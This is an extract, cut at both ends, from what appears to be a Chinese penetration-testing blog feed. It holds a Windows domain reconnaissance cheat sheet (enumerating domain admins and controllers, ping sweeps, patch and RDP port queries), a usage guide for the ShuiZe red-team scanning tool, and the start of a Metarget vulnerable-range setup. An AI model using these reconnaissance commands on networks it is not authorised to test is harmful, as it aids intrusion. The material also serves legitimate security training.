<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>net group “domain computers” /domain</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查看域内的电脑</span></pre></td></tr><tr><td data-num="3"></td><td><pre>net group “domain admins” /domain</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#查看域管理员</span></pre></td></tr><tr><td data-num="5"></td><td><pre>net group “domain controllers” /domain</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#查看域控</span></pre></td></tr><tr><td data-num="7"></td><td><pre>net user hacker /domain</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">#获得 hacker 账户的具体信息</span></pre></td></tr><tr><td data-num="9"></td><td><pre>net accounts /domain</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">#获得域内账户的密码策略信息</span></pre></td></tr><tr><td data-num="11"></td><td><pre>net accounts</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">#查询本地账户的密码策略信息</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320212953643.png" alt="image-20220320212953643" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>net view /domain:domain_name</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查看域内的电脑</span></pre></td></tr></table></figure><p>其他用法：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>net view</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查询同一个域内的机器列表</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320213127725.png" alt="image-20220320213127725" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>net view /domain</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查看几个域</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320213106090.png" alt="image-20220320213106090" /></p>
<p>服务相关：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>net start</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查看开启的服务</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320213159964.png" alt="image-20220320213159964" /></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>net stop servicename</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#关闭服务</span></pre></td></tr></table></figure><p>nbtstat：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>nbtstat –A <span class="token function">ip</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#查看目标 ip 的用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">netstat</span> <span class="token function">netstat</span> -bnao</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#查看任务跟 pid 端口等</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">netstat</span> -r</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#查看路由</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token function">netstat</span> -anplt</pre></td></tr><tr><td data-num="8"></td><td><pre>-a或–all：显示所有连线中的Socket；</pre></td></tr><tr><td data-num="9"></td><td><pre>-n或–numeric：直接使用ip地址，而不通过域名服务器；</pre></td></tr><tr><td data-num="10"></td><td><pre>-p或–programs：显示正在使用Socket的程序识别码和程序名称；</pre></td></tr><tr><td data-num="11"></td><td><pre>-l或–listening：显示监控中的服务器的Socket；</pre></td></tr><tr><td data-num="12"></td><td><pre>-t或–tcp：显示TCP传输协议的连线状况；</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320213508459.png" alt="image-20220320213508459" /></p>
<p>定位域控：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>net <span class="token function">time</span> /domain</pre></td></tr><tr><td data-num="2"></td><td><pre>systeminfo 中的 domain</pre></td></tr><tr><td data-num="3"></td><td><pre>ipconfig /all 中的 DNS Suffix Search List</pre></td></tr><tr><td data-num="4"></td><td><pre>扫描53端口，找 dns 位置</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin class-name">set</span> log</pre></td></tr><tr><td data-num="6"></td><td><pre>net group “domain controllers” /domain</pre></td></tr></table></figure><p>其他：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#一条 cmd 命令 ping 内网存活主机</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">for</span> /l %i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1,1</span>,255<span class="token punctuation">)</span> <span class="token keyword">do</span> @ping <span class="token number">192.168</span>.1.%i -w <span class="token number">1</span> -n <span class="token number">1</span> <span class="token operator">|</span> <span class="token function">find</span> /i “ttl”</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 将 net view 的结果挨个 ping 一遍，输出机器名和 ip</span></pre></td></tr><tr><td data-num="4"></td><td><pre>FOR /F <span class="token string">"eol=- tokens=1 delims=\ "</span> %a IN <span class="token punctuation">(</span>‘net view’<span class="token punctuation">)</span> DO @<span class="token punctuation">(</span>echo name: %a, ip: <span class="token operator">&amp;</span> <span class="token function">ping</span> %a -w <span class="token number">1</span> -n <span class="token number">1</span> <span class="token operator">|</span> <span class="token function">find</span> /i “ttl” <span class="token operator">&amp;</span> echo.<span class="token punctuation">)</span></pre></td></tr></table></figure><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>任务管理器taskmgr</pre></td></tr><tr><td data-num="2"></td><td><pre>桌面进程explorer</pre></td></tr><tr><td data-num="3"></td><td><pre>组策略设置:gpedit.msc</pre></td></tr><tr><td data-num="4"></td><td><pre>appwiz.cpl添加与删除</pre></td></tr><tr><td data-num="5"></td><td><pre>sysdm.cpl 系统属性页面可以配置环境变量</pre></td></tr><tr><td data-num="6"></td><td><pre>tasklist /svc <span class="token comment">#查看当前的任务列表</span></pre></td></tr><tr><td data-num="7"></td><td><pre>taskkill /f /pid <span class="token number">123</span> <span class="token comment">#强制终止 pid 为 123 的任务</span></pre></td></tr><tr><td data-num="8"></td><td><pre>gpedit.msc <span class="token comment">#打开本地组策略管理</span></pre></td></tr><tr><td data-num="9"></td><td><pre>eventvwr <span class="token comment">#打开日子页面</span></pre></td></tr><tr><td data-num="10"></td><td><pre>services.msc <span class="token comment">#打开服务页面</span></pre></td></tr><tr><td data-num="11"></td><td><pre>gpupdate /force 强制同步组策略</pre></td></tr><tr><td data-num="12"></td><td><pre>runas /user:administrator（用户名）</pre></td></tr><tr><td data-num="13"></td><td><pre>cmd.exe（应用程序的名字）<span class="token comment">#cmd 切换用户</span></pre></td></tr><tr><td data-num="14"></td><td><pre>systeminfo <span class="token operator">|</span> <span class="token function">find</span> /i “kB” <span class="token comment">#查看系统补丁</span></pre></td></tr><tr><td data-num="15"></td><td><pre>REG query HKLM<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Control<span class="token punctuation">\</span>Terminal<span class="token string">" "</span>Server<span class="token punctuation">\</span>WinStations<span class="token punctuation">\</span>RDP-Tcp /v PortNumber <span class="token comment">#获得远程端口</span></pre></td></tr><tr><td data-num="16"></td><td><pre>klist <span class="token comment">#检验缓存票据</span></pre></td></tr><tr><td data-num="17"></td><td><pre>klist purge <span class="token comment">#删除所有票据</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集自动化工具-水泽使用记录</title>
    <url>/article/a97dc026.html</url>
    <content><![CDATA[<h2 id="0x01前言"><a class="anchor" href="#0x01前言">#</a> 0x01 前言</h2>
<p>定位：协助红队人员快速的信息收集，测绘目标资产，寻找薄弱点</p>
<p>语言：python3 开发</p>
<p>功能：一条龙服务，只需要输入根域名即可全方位收集相关资产，并检测漏洞。也可以输入多个域名、C 段 IP 等，具体案例见下文。</p>
<p>调用：脚本借用了 ksubdomain 爆破子域名和 theHarvester 收集邮箱</p>
<p>项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzB4NzI3L1NodWlaZV8weDcyNw==">https://github.com/0x727/ShuiZe_0x727</span></p>
<h2 id="0x02-安装"><a class="anchor" href="#0x02-安装">#</a> 0x02 安装</h2>
<p>为了避免踩坑，建议安装在如下环境中</p>
<ul>
<li>root 权限</li>
<li>Python&gt;=3.7 以上</li>
<li>在配置文件 iniFile/config.ini 里加入 api（fofa、shodan、github、virustotal）</li>
</ul>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">chmod</span> <span class="token number">777</span> build.sh</pre></td></tr><tr><td data-num="2"></td><td><pre>./build.sh</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321184003583.png" alt="image-20220321184003583" /></p>
<p>报错：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>ERROR: Cannot uninstall <span class="token string">'Cython'</span><span class="token builtin class-name">.</span> It is a distutils installed project and thus we cannot accurately determine <span class="token function">which</span> files belong to it <span class="token function">which</span> would lead to only a partial uninstall.</pre></td></tr></table></figure><p>采用以下方式进行安装</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>pip <span class="token function">install</span> --ignore-installed Cython</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321185816656.png" alt="image-20220321185816656" /></p>
<p>再次执行即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321185925040.png" alt="image-20220321185925040" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>python3 ShuiZe<span class="token punctuation">.</span>py <span class="token operator">-</span>h</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321185943043.png" alt="image-20220321185943043" /></p>
<h3 id="docker运行shuize"><a class="anchor" href="#docker运行shuize">#</a> docker 运行 ShuiZe</h3>
<p>通过下面的命令安装 docker，然后拉取 python3.8 的容器，再 git clone 水泽后，运行 docker_build.sh 即可。</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">apt</span> <span class="token function">install</span> docker.io</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">docker</span> pull yankovg/python3.8.2-ubuntu18.04</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">docker</span> run -itd yankovg/python3.8.2-ubuntu18.04 <span class="token function">bash</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">docker</span> <span class="token builtin class-name">exec</span> -it docker的ID /bin/bash</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">apt-get</span> update</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span> --fix-missing</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token function">apt</span> <span class="token function">install</span> <span class="token function">vim</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token function">rm</span> /usr/bin/python3</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token function">ln</span> -s /usr/local/bin/python3.8 /usr/bin/python3</pre></td></tr><tr><td data-num="10"></td><td><pre>python3 -m pip <span class="token function">install</span> --upgrade pip</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token function">git</span> clone https://github.com/0x727/ShuiZe_0x727.git</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token function">chmod</span> <span class="token number">777</span> docker_build.sh</pre></td></tr><tr><td data-num="13"></td><td><pre>./docker_build.sh</pre></td></tr></table></figure><h2 id="0x03-效果展示"><a class="anchor" href="#0x03-效果展示">#</a> 0x03 效果展示</h2>
<p>备案反查顶级域名</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321190508493.png" alt="image-20220321190508493" /></p>
<p>不是泛解析，调用 ksubdomain 爆破子域名</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321190551657.png" alt="image-20220321190551657" /></p>
<p>扫描结果保存在 excel 文件里</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728170303756.png" alt="image-20210728170303756" /></p>
<p>excel 的内容如下</p>
<p>备案反查顶级域名</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728163926763.png" alt="image-20210728163926763" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728163940918.png" alt="image-20210728163940918" /></p>
<p>邮箱</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728164010063.png" alt="image-20210728164010063" /></p>
<p>Github 敏感信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728164040649.png" alt="image-20210728164040649" /></p>
<p>爬虫</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728164146630.png" alt="image-20210728164146630" /></p>
<p>证书</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728164211552.png" alt="image-20210728164211552" /></p>
<p>子域名 A 记录和 CDN</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728164316747.png" alt="image-20210728164316747" /></p>
<p>动态链接和后台地址</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728164555141.png" alt="image-20210728164555141" /></p>
<p>网络空间搜索引擎</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728164745820.png" alt="image-20210728164745820" /></p>
<p>ip 反查域名</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728164811422.png" alt="image-20210728164811422" /></p>
<p>存活网站标题</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728164933353.png" alt="image-20210728164933353" /></p>
<p>指纹和漏洞</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728165004202.png" alt="image-20210728165004202" /></p>
<p>相关域名和 C 段</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210728165052361.png" alt="image-20210728165052361" /></p>
<h2 id="0x04-poc编写"><a class="anchor" href="#0x04-poc编写">#</a> 0x04 POC 编写</h2>
<p>POC 的模板文件例子： <code>Plugins/Vul/Web/__template__.py</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321191539854.png" alt="image-20220321191539854" /></p>
<p>只需要在 run_detect 方法里调用 POC 的利用方法即可。</p>
<h2 id="0x05-使用方法"><a class="anchor" href="#0x05-使用方法">#</a> 0x05 使用方法</h2>
<table>
<thead>
<tr>
<th style="text-align:left">语法</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">python3 <span class="exturl" data-url="aHR0cDovL1NodWlaZS5weQ==">ShuiZe.py</span> -d <span class="exturl" data-url="aHR0cDovL2RvbWFpbi5jb20=">domain.com</span></td>
<td style="text-align:left">收集单一的根域名资产</td>
</tr>
<tr>
<td style="text-align:left">python3 <span class="exturl" data-url="aHR0cDovL1NodWlaZS5weQ==">ShuiZe.py</span> --domainFile domain.txt</td>
<td style="text-align:left">批量跑根域名列表</td>
</tr>
<tr>
<td style="text-align:left">python3 <span class="exturl" data-url="aHR0cDovL1NodWlaZS5weQ==">ShuiZe.py</span> -c 192.168.1.0,192.168.2.0,192.168.3.0</td>
<td style="text-align:left">收集 C 段资产</td>
</tr>
<tr>
<td style="text-align:left">python3 <span class="exturl" data-url="aHR0cDovL1NodWlaZS5weQ==">ShuiZe.py</span> -f url.txt</td>
<td style="text-align:left">对 url 里的网站漏洞检测</td>
</tr>
<tr>
<td style="text-align:left">python3 <span class="exturl" data-url="aHR0cDovL1NodWlaZS5weQ==">ShuiZe.py</span> --fofaTitle XXX 大学</td>
<td style="text-align:left">从 fofa 里收集标题为 XXX 大学的资产，然后漏洞检测</td>
</tr>
<tr>
<td style="text-align:left">python3 <span class="exturl" data-url="aHR0cDovL1NodWlaZS5weQ==">ShuiZe.py</span> -d <span class="exturl" data-url="aHR0cDovL2RvbWFpbi5jb20=">domain.com</span> --justInfoGather 1</td>
<td style="text-align:left">仅信息收集，不检测漏洞</td>
</tr>
<tr>
<td style="text-align:left">python3 <span class="exturl" data-url="aHR0cDovL1NodWlaZS5weQ==">ShuiZe.py</span> -d <span class="exturl" data-url="aHR0cDovL2RvbWFpbi5jb20=">domain.com</span> --ksubdomain 0</td>
<td style="text-align:left">不调用 ksubdomain 爆破子域名</td>
</tr>
</tbody>
</table>
<p><strong>郑重声明：</strong> <code>文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担。</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321192815427.png" alt="image-20220321192815427" /></p>
]]></content>
      <categories>
        <category>STools</category>
      </categories>
      <tags>
        <tag>STools</tag>
      </tags>
  </entry>
  <entry>
    <title>云原生攻防靶场-Metarget搭建记录</title>
    <url>/article/b3617362.html</url>
    <content><![CDATA[<p>师傅门好强哇 qwq！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308203031241.png" alt="image-20220308203031241" /></p>
<p>由于 Metarget 的操作对象均为底层基础设施，请您注意以下三点：</p>
<ol>
<li>请勿在重要机器和生产环境使用。</li>
<li>在使用前，请对当前环境的重要信息做好备份。</li>
<li>如果执行失败，可添加 <code>–verbose</code>  选项并再次执行，查看是哪里出错，欢迎提交 issue。底层环境部署复杂度较高，部署失败是难免的，希望能够得到您的支持，一起改进 Metarget！</li>
</ol>
<h2 id="设计理念"><a class="anchor" href="#设计理念">#</a> 设计理念</h2>
<p>Metarget 项目的预期目标很清晰，也很好理解：</p>
<ol>
<li>实现云原生组件脆弱场景的自动化构建（特定环境）。</li>
<li>在 1 的基础上，对接容器化应用脆弱场景，实现云原生多层次脆弱场景的自动化构建（靶机）。</li>
<li>在 1、2 的基础上，实现多节点 + 多层次脆弱云原生集群的自动化构建（靶场）。</li>
</ol>
<p>其中，目标 1 主要面向安全研究人员，方便进行漏洞学习、调试，特定 PoC、ExP 的编写和测试；目标 2 和 3 主要面向想要磨练云原生安全攻防实战技能的红蓝对抗、渗透测试人员。</p>
<p>除此之外，云原生安全产品开发的同学也可以借助 Metarget 项目部署脆弱环境，测试防御系统的威胁检测能力和响应能力。</p>
<p>请注意，虽然在英文中，脆弱性和漏洞是同一个词（Vulnerability），但是结合安全领域的实际情况来看，有的脆弱场景被分配了 CVE 编号；有的虽然没有 CVE 编号，但是分配了厂商自己的编号；有的脆弱场景却由于各种原因并没有统一的命名。这些情况都很常见。 <code>Metarget</code>  不仅关注狭义上的漏洞，而是希望在适用场景范围内，实现对上述各种情况的脆弱场景的自动化构建。</p>
<p>接下来，我们会谈一谈 <code>Metarget</code>  项目的两个核心理念，然后向大家介绍 <code>Metarget</code>  的基本使用方法和目前支持的脆弱场景。</p>
<ul>
<li><strong>“安装漏洞”</strong></li>
</ul>
<p>在 <code>Metarget</code>  项目中，我们提出 “安装漏洞”、“安装脆弱场景” 的概念。漏洞为什么不能像软件一样直接安装呢？程序为实，漏洞为虚；软件为满，漏洞为缺。那么只需换一种视角，视虚为实，以缺为满，我们完全可以像安装软件一样安装漏洞 —— 以安全研究、攻防实战为目的。</p>
<p>具体来说，我们希望执行类似 <code>metarget cnv install cve-2019-5736</code>  的命令，直接将带有 <code>CVE-2019-5736</code>  漏洞的 <code>Docker</code>  安装在服务器上。</p>
<p>有安装，就有卸载。举例来说，我们希望通过执行类似 <code>metarget cnv remove cve-2019-5736</code>  的命令将漏洞组件从系统移除。</p>
<ul>
<li><strong>复杂脆弱场景</strong></li>
</ul>
<p>仅仅做单个脆弱场景的自动化构建，像滚雪球一样，随着云原生技术的发展、安全研究的推进，不断收集脆弱场景，亦无不可。然而， <code>Metarget</code>  还应该能做的更多，尤其是在云原生技术的加持下，我们希望它能够实现多节点、多层次的复杂脆弱场景构建。</p>
<p>如下图所示，从攻击者的视角来看，边界突破、扩大战果、访问持久化，每一个步骤都涉及许多不同的技术手段、漏洞利用手法。如果能够以云原生集群为依托，将这些技艺的应用场景组合起来，就能够呈现更有意思的攻防场景，磨练出更加强大的攻防本领。攻防相砺，故从防守者视角来看也是如此。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/1-3-1024x489.png" alt="img" /></p>
<p>也正是从这一点（基于云原生技术制作复杂场景）出发，我们将 <code>Metarget</code>  定位在云原生攻防靶场。这是它的独特意义所在。</p>
<h2 id="安装教程"><a class="anchor" href="#安装教程">#</a> 安装教程</h2>
<p><code>Metarget</code>  目前仅支持在 <code>Ubuntu 16.04</code>  和 <code>18.04</code>  安装运行，在 <code>20.04</code>  上可能会遇到依赖项问题。安装步骤十分简单。<br />
这里使用的是一台纯净的 <code>Ubuntu 18.04</code>  为例进行安装：</p>
<h3 id="开启ubuntu1804开启root远程登录"><a class="anchor" href="#开启ubuntu1804开启root远程登录">#</a> 开启 Ubuntu18.04 开启 root 远程登录</h3>
<p>习惯于在 FinalShell 或 XShell 上进行操作的开启远程登录，不开就直接在控制台上进行也行。</p>
<ol>
<li>桌面上右键打开终端，通过 <code>su -</code>  获取 <code>root权限</code> ，或者通过 <code>sudo</code>  提升权限，键入如下命令：</li>
</ol>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">apt-get</span> <span class="token function">install</span> openssh-server</pre></td></tr></table></figure><p>按 <code>y</code>  同意执行即可。</p>
<ol start="2">
<li>开启 root 用户远程登录（按个人要求开启）</li>
</ol>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">vim</span> /etc/ssh/sshd_config</pre></td></tr></table></figure><p>打开 22 端口</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308144339446.png" alt="image-20220308144339446" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308143757488.png" alt="image-20220308143757488" /></p>
<p>将 <code>PermitRootLogin</code>  修改为 <code>yes</code> ，如下图所示：</p>
<ol start="3">
<li>启动 SSH 服务</li>
</ol>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>/etc/init.d/ssh start</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308143910088.png" alt="image-20220308143910088" /></p>
<ol start="4">
<li>查看 SSH 是否启动成功</li>
</ol>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">ps</span> -e <span class="token operator">|</span> <span class="token function">grep</span> sshd</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308143944550.png" alt="image-20220308143944550" /></p>
<ol start="5">
<li>关闭 SSH 服务</li>
</ol>
<pre><code>/etc/init.d/ssh stop
</code></pre>
<ol start="6">
<li>远程登录</li>
</ol>
<p>ifconfig 查看本机 IP</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308144051045.png" alt="image-20220308144051045" /></p>
<p>进行远程 root 登录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308144219240.png" alt="image-20220308144219240" /></p>
<p>成功登录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220308144733598.png" alt="image-20220308144733598" /></p>
<h3 id="给ubuntu1804更换国内源"><a class="anchor" href="#给ubuntu1804更换国内源">#</a> 给 Ubuntu18.04 更换国内源</h3>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 首先备份源列表</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">cp</span> /etc/apt/sources.list /etc/apt/sources.list_backup</pre></td></tr></table></figure><p>打开 <code>/etc/apt/sources.list</code></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 打开 sources.list 文件</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> gedit /etc/apt/sources.list</pre></td></tr></table></figure><p>编辑 **/etc/apt/sources.list** 文件，在文件最前面添加阿里云镜像源：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#  阿里源</span></pre></td></tr><tr><td data-num="2"></td><td><pre>deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="3"></td><td><pre>deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="4"></td><td><pre>deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="5"></td><td><pre>deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="6"></td><td><pre>deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="7"></td><td><pre>deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="8"></td><td><pre>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="9"></td><td><pre>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="10"></td><td><pre>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="11"></td><td><pre>deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">#  中科大源</span></pre></td></tr><tr><td data-num="14"></td><td><pre>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="15"></td><td><pre>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="16"></td><td><pre>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="17"></td><td><pre>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="18"></td><td><pre>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="19"></td><td><pre>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="20"></td><td><pre>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="21"></td><td><pre>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="22"></td><td><pre>deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="23"></td><td><pre>deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment"># 163 源</span></pre></td></tr><tr><td data-num="26"></td><td><pre>deb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="27"></td><td><pre>deb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="28"></td><td><pre>deb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiverse</pre></td></tr><tr><td data-num="29"></td><td><pre>deb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiverse</pre></td></tr><tr><td data-num="30"></td><td><pre>deb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse</pre></td></tr><tr><td data-num="31"></td><td><pre>deb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiverse</pre></td></tr><tr><td data-num="32"></td><td><pre>deb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiverse</pre></td></tr><tr><td data-num="33"></td><td><pre>deb-src 